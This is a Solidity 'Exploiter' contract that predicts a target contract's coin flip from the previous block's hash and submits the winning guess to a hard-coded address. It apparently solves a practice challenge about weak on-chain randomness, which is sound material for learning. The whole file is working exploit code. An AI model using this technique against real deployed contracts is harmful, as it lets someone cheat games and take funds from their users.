// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface Target {
    function flip(bool _guess) external returns (bool);
}

contract Exploiter {
    using SafeMath for uint256;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    Target target = Target(0xa63375092861FF43977506e7D0928f666c233Fb4);

    function exploitFlip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == true) {
            target.flip(true);
        } else {
            target.flip(false);
        }
    }
}
